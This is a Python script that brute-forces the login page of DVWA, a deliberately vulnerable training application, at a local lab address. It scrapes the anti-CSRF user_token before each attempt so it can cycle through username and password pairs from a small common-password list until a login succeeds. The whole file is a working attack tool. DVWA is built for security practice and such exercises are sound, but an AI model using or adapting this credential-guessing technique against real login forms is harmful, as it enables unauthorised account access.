import requests
from bs4 import BeautifulSoup

#dict
payloads = [
    'administrator',
    'admin',
    'password',
    'passwd',
    '123456',
    '123'
]

url = """http://192.168.1.66/DVWA-master/vulnerabilities/brute/?username={0}&password={1}&Login=Login&user_token={2}"""

cookies = {
    'security':'high',
    'PHPSESSID':'mfnrbgq0q5qepj43egak4amjjl'
}

headers = {
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
}

def attack(payloads,url):
    #get user_token
    source = 'http://192.168.1.66/DVWA-master/vulnerabilities/brute/index.php#'
    web_data = requests.get(source, headers = headers, cookies = cookies)
    soup = BeautifulSoup(web_data.text, 'lxml')
    user_token = soup.select('input[name="user_token"]')[0]['value']

    for payload1 in payloads:
        for payload2 in payloads:
            target = url.format(payload1, payload2, user_token)
            print('target url: ' + target)
            web_data = requests.get(target,headers = headers, cookies = cookies)
            soup = BeautifulSoup(web_data.text,'lxml')
            user_token = soup.select('input[name="user_token"]')[0]['value']
            feature = soup.find('pre')
            try:
                if feature.get_text() == 'Username and/or password incorrect.':
                    print('error')
            except:
                print('result:')
                print('username:' + payload1+'\n' + 'password:' + payload2)
                exit('end')

attack(payloads,url)